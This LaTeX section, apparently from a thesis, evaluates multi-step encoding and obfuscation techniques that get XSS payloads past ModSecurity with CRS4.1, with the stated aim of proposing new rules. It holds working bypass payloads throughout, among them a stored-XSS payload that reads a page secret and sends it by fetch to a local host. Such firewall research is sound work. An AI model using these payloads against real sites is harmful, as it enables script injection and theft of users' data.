\subsection{Multi Iteration Evaluation}
\label{sec:multiiteration}
This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}.


\subsubsection{Percent encoding + Unicode in JSON}
The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
The ModSecurity firewall detected the unicode escape regardless and rejects the request:

{\color{red} check this payload}
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}


\subsubsection{Double Percent encoding}
\label{sec:doublepercenc}
The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:

\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}, escapeinside=\^\^, language=Python]
import urllib
urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
returns
alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
\end{lstlisting}

However, this payload would not be valid unless the target also performs multiple step url decoding. Multiple step url decoding is forbidden according to RFC3986 "Uniform Resource Identifier (URI): Generic Syntax" - Section 2.4:
\begin{quote}
	Implementations must not
	percent-encode or decode the same string more than once, as decoding
	an already decoded string might lead to misinterpreting a percent
	data octet as the beginning of a percent-encoding, or vice versa in
	the case of percent-encoding an already percent-encoded string.
\end{quote}


\subsubsection{Double HTML character reference}
\label{sec:doublehtmlcharref}
As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules caused the ModSecurity firewall using CRS4.1 to block the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
<a href=javascript:alert('a')>ClickMeFor$</a>
\end{lstlisting}

After obscuring the payload with a single iteration of HTML character reference substitution, the modified payload:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

successfully bypassed two of the three rules that caused the firewall to block the request.

On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}, escapeinside=\^\^]
<a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
\end{lstlisting}

and successfully bypasses the ModSecurity firewall using CRS4.1.


\subsubsection{HTML encoding + JavaScript normal character escape}
\label{sec:htmlencjsesc}
The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
It was blocked by the ModSecurity firewall based on 4 rule triggers:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a></payload>

<message>"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "88"] [id "934110"]<fileDetails>
<MatchedData>"http://localhost"</MatchedData>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "225"] [id "941170"]<fileDetails>
<MatchedData>"javascript:[...]"</MatchedData>

<message>"Node-Validator Deny List Keywords"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "252"] [id "941180"]<fileDetails>
<MatchedData>".innerhtml"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "323"] [id "941210"]<fileDetails>
<MatchedData>"javascript:v"</MatchedData>
\end{lstlisting}

As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters.
On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evaded the rules with ids \verb|941170| and \verb|941210|.
On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evaded rule \verb|941180|.
Finally one of the \verb|/| in the url-string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|.
Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
<a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
\end{lstlisting}

\subsubsection{Function constructor + String concatenation + From charcode}
\label{sec:charcodemultiiter}
Following up on the idea to split the character sequence \verb|String.fromCharCode| into multiple segments, which was stated during the single iteration evaluation under Section~\ref{sec:charcodesingleiter}, the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)
\end{lstlisting}

was split into two parts using the function constructor and string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)')();
\end{lstlisting}

This payload successfully bypasses the ModSecurity firewall configured to use the CRS4.1. In order to make this payload execute by itself, another use of the function constructor and string concatenation was applied:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
\end{lstlisting}

On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload>
[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')();
</payload>

<message>"PHP Injection Attack: Variable Function Call Found"</message>
<file>"/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "488"] [id "933210"]<fileDetails>
<MatchedData>"('[].map.constructor(''String.''fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'')();')();"</MatchedData>
\end{lstlisting}

The regex used in this rule:

\begin{lstlisting}[style=basicStyle]
(?:\((?:.+\)(?:[\"'][\-0-9A-Z_a-z]+[\"'])?\(.+|[^\)]*string[^\)]*\)[\s\x0b\"'\-\.0-9A-\[\]_a-\{\}]+\([^\)]*)|(?:\[[0-9]+\]|\{[0-9]+\}|\$[^\(\),\.\/;\x5c]+|[\"'][\-0-9A-Z\x5c_a-z]+[\"'])\(.+)\);
\end{lstlisting}

requires a semicolon to finish the statement. In JavaScript, cases exist, where this semicolon is not neccessary. One such case would be the existance of a semicolon finished statement in the code just before where the payload is injected and a newline followed by another function call or variable assignment in the code after where the payload is injected. A case where the semicolon would be neccessary to achieve code execution is the following:

\begin{lstlisting}[style=basicStyle, language=Python]
<statements before>

[].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)' + ')();')()

[].constructor.constructor('alert("exception")')()

<statements after>
\end{lstlisting}

JavaScript is able to automatically insert some semicolons to create valid syntax from statements where the semicolons have been omitted. JavaScript's automatic semicolon insertion rules are stated under \cite{js/autosemi}.


\subsubsection{Eval + JavaScript character escape}
\label{sec:jsescapemultiiter}
As shown in Section~\ref{sec:jsescapesingleiter}, JavaScript's unicode code point escape sequence can be used to escape identifiers.
Characters in String literals can also be replaced by escape sequences in JavaScript. Considering the bypass in Listing~\ref{lst:strconcbypass} mentioned under Section~\ref{sec:stringconcsingleiter}, the bypassing payload containing a string literal:

\begin{lstlisting}[style=basicStyle, language=Python]
'alert' + '(`concatenation`)'
\end{lstlisting}

with the intention of bypassing the regex filter matching on \verb|alert(| can be improved. The payload needs to be evaluated twice on the target in order to achieve the desired effect. The first evaluation concatenates the string composing the desired JavaScript statements, the second evaluation achieved the desired effect through evaluating JavaScript statements contained in the just concatenated string. 

The first way to substitute the evaluation, that concatenates the payload string, is by a payload obscured using JavaScrip escape sequences instead of string concatenation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='alert\textbackslash u\{0028\}`escaped`) bypass]
'alert\u{0028}`escaped`)'
\end{lstlisting}

Through substituting the opening parenthesis \verb|(|, the firewall does not match on the character sequence \verb|alert(| and the string concatenation can be omitted.

The second way to substitute the evaluation, that concatenates the payload string, is by a payload using \verb|eval()| that has been obscured through JavaScript escape sequences that enforces this evaluation:

\begin{lstlisting}[style=basicStyle, language=Python, caption='ev\textbackslash u\{0061\}l('alert' + '(`escaped`)') bypass]
ev\u{0061}l('alert' + '(`escaped`)')
\end{lstlisting}

Through substituting a part of the \verb|eval()| function, matches on \verb|eval(|, that are seen in Listing~\ref{lst:evalalertXSSblocked} under Section~\ref{sec:evalsingleiter}, are avoided. A similar result to the bypass listed in Listing~\ref{lst:funconbypass} under Section~\ref{sec:functionconstructorsingleeva} has been achieved.



\subsubsection{Function constructor + String concatenation}
\label{sec:funconstrconbypass}
In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
The basic implementation was blocked by the ModSecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
<payload>new Function('var s = "secret";prompt("something", s)')()</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"new Function("</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}

To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

\subsubsection{Avoiding ()}
\label{sec:avoidingbypassA}
In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads still need to be valid and bypass the waf.
Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This caused another firewall rule to trigger:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () blocked, label={lst:avoiding () blocked}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something${s}`'}```</payload>

<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${s}"</MatchedData>
\end{lstlisting}

Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using square bracket notation]
[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
This seems to be a bug in the WAF or the ruleset.
It is also what enables the above payload to be valid.
A substitution of the earlier \verb|$| with an escaped variant is not possible.
JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.

% console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

\subsubsection{Avoiding \{\}}
\label{sec:avoidingbypassB}
A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${2 2}"</MatchedData>
\end{lstlisting}

On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

successfully evaded the firewall.

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

\subsubsection{Forcing unicode normalization}
\label{sec:forcedunicodenorm}
As stated before, a payload containing the \verb|prompt()| function:

\begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
prompt('',secret)
\end{lstlisting}

is being blocked by the ModSecurity firewall using CRS4.1 according to the rule:

\begin{lstlisting}[style=ruleStyle, language=XML]
<payload>prompt("", secret)</payload>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}

in order to avoid the CRS rule with id \verb|931390|, that matches on the character sequence \verb|prompt(|, tagged template literals have been used to obscure the payload:

\begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
prompt`${secret}`
\end{lstlisting}

this payload bypasses the initially triggered rule but triggers a different rule:

\begin{lstlisting}[style=ruleStyle, language=XML]
<payload>prompt`${secret}`</payload>

<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${secret}"</MatchedData>
\end{lstlisting}

Based on this result, it stands to reason that the next step should be to avoid that parts of the payload match on the regular expression: \verb|\$(?:\{.*\})|, which is a simplified form of the regular expression used in the CRS rule with id \verb|932130|.

Previous results stated in this section either used JavaScript's character escaping (Section~\ref{sec:avoidingbypassA}) or string concatenation and replacement strategies (Section~\ref{sec:avoidingbypassB}). Single iteration results stated under Section~\ref{sec:uninormsingleiter} have shown that replacing parts of a payload with unicode symbols successfully makes payloads bypass the evaluated firewall. The payloads mentioned under Section~\ref{sec:uninormsingleiter} depend on unicode normalization implemented by the Web server receiving those requests. 

If the Web server is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69: 

\begin{lstlisting}[style=basicStyle, language=Python]
prompt`\uFE69{secret}`
\end{lstlisting}

Similar to the evaluation results stated under Section~\ref{sec:unicodeinjsontest}, the CRS4.1 rule with id \verb|920540| got triggered by the unicode escape sequence:

\begin{lstlisting}[style=ruleStyle, language=XML]
<payload>prompt`\uFE69{secret}`</payload>

<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cuFE69"</MatchedData>
\end{lstlisting}

The ModSecurity log file does not mention any transformations used by the rule before checking for matching character sequences. This was confirmed by looking at the rule with id \verb|920540| in the file \verb|REQUEST-920-PROTOCOL-ENFORCEMENT.conf| where it states: \verb|t:none|. Based on this observation, the JavaScript escape sequences evaluation results stated under Section~\ref{sec:jsescapesingleiter} and the unicode normalization results stated under Section~\ref{sec:uninormsingleiter}, three techniques to evade CRS4.1 rule with id \verb|920540| seem promising:

\begin{enumerate}
	\item Percent encoding the payload
	\item Using the Unicode code point escape sequence
	\item Directly putting the small dollar sign character into the payload, without any escaping
\end{enumerate}

(1.) Percent encoding was done using the python statement:

\begin{lstlisting}[style=basicStyle, language=Python]
urllib.parse.quote_plus("prompt`\uFE69{secret}`")
\end{lstlisting}

which returns the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
prompt%60%EF%B9%A9%7Bsecret%7D%60
\end{lstlisting}

This payload successfully bypasses the evaluated firewall. 

(2.) Using a Unicode code point escape sequence introduced in ES6, the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
prompt`\u{FE69}{secret}`
\end{lstlisting}

successfully bypasses the evaluated firewall.

(3.) When directly putting the small dollar sign character (U+FE69) into the payload (in this document, the character (U+FE69) is replaced by the regular \$ sign surrounded by whitespaces):

\begin{lstlisting}[style=basicStyle, language=Python]
prompt` $ {secret}`
\end{lstlisting}

the resulting payload bypasses the evaluated firewall.

In the proceeding of this section, only option 1.: percent encoding, will be used in following iterations of payload modification.

At this point, the payload is still depends on the Web server performing Unicode normalization. To avoid this dependency, attacker might try and enforce the normalization of the payload. Forced normalization can be achieved by passing the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
prompt`\uFE69{secret}`
\end{lstlisting}

as a string and an argument to the \verb|eval()| function. The call to the \verb|normalize()| function is appended to the payload string:

\begin{lstlisting}[style=basicStyle, language=Python]
eval('prompt`\uFE69{secret}`'.normalize('NFKC'))
\end{lstlisting}

The \verb|eval()| function will be used to evaluate the normalized payload string. Similar to the results stated under Section~\ref{sec:functionconstructorsingleeva}, the payload that is using the \verb|eval()| function is being blocked. In the next iteration, \verb|eval()| was substituted using the technique described under Section~\ref{sec:functionconstructor}. The obscured payload after this iteration:

\begin{lstlisting}[style=basicStyle, language=Python]
[].map.constructor('prompt`\uFE69{secret}`'.normalize('NFKC'))()
\end{lstlisting}

bypasses CRS4.1 rules that try to prohibit payloads including the character sequence of \verb|eval(| but still matches on rule with id \verb|920540| and message: \quotes{Possible Unicode character bypass detected}. Therefore, in the following iteration, the payload was percent encoded, again using the \verb|quote_plus()| python function, which returned: 

\begin{lstlisting}[style=basicStyle, language=Python]
%5B%5D.constructor.constructor%28%27prompt%60%EF%B9%A9%7Bsecret%7D%60%27.normalize%28%27NFKC%27%29%29%28%29
\end{lstlisting}

The percent encoded payload successfully bypasses the ModSecurity firewall using CRS4.1. If decoded on the Web server, it resolves into the targeted payload (the character U+FE69 is displayed by the regular \$ surrounded by whitespaces in this document):

\begin{lstlisting}[style=basicStyle, language=Python]
"[].constructor.constructor('prompt` $ {secret}`'.normalize('NFKC'))()"
\end{lstlisting}





